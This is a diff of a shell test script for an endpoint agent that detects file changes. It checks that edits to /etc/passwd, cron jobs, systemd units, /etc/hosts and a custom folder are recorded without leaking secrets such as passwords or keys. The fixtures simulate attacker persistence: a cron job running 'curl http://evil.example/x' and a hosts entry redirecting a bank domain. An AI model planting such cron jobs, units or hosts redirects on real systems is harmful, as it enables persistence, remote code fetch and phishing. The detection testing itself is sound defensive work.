@@ -156,7 +156,7 @@ chk "/etc/passwd: modified, the new account line is shown, the password field is
 chk "cron.d: the new job is added, watch lnx.cron" '[ "$(rec /etc/cron.d/evil "change_type, watch")" = "1|lnx.cron" ] && dbq "SELECT new_value FROM endpoint_agent_change_records WHERE target = '\''/etc/cron.d/evil'\''" | grep -q "curl http://evil.example/x"'
 chk "systemd: the new unit is added, watch lnx.systemd" '[ "$(rec /etc/systemd/system/evil.service "change_type, watch")" = "1|lnx.systemd" ]'
 chk "/etc/hosts: modified, watch lnx.hosts" '[ "$(rec /etc/hosts "change_type, watch")" = "2|lnx.hosts" ] && dbq "SELECT new_value FROM endpoint_agent_change_records WHERE target = '\''/etc/hosts'\''" | grep -q "bank.example.com"'
-chk "the custom folder: app.conf is modified with the secret masked" '[ "$(rec /etc/proof.d/app.conf "change_type, watch, flags")" = "2|custom.proof|1" ]'
+chk "the custom folder: app.conf is modified, hash only (a custom watch captures no lines)" '[ "$(rec /etc/proof.d/app.conf "change_type, watch, flags")" = "2|custom.proof|0" ] && dbq "SELECT summary FROM endpoint_agent_change_records WHERE target = '\''/etc/proof.d/app.conf'\''" | grep -q "no line detail"'
 chk "no secret reached the database: not hunter2, not hunter3, no key material" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE CONCAT(old_value, new_value, summary, target, item) REGEXP '\''hunter|KEYMATERIAL|PRIVATE KEY'\''")" = 0 ]'
 chk "the credential files of the watched folder produced no record" '[ "$(dbq "SELECT COUNT(*) FROM endpoint_agent_change_records WHERE target LIKE '\''%id_rsa%'\'' OR target LIKE '\''%site.key%'\''")" = 0 ]'
 chk "...and the agent's state file still holds none of it" '! q grep -q -e hunter -e KEYMATERIAL $SD/change_state.json'
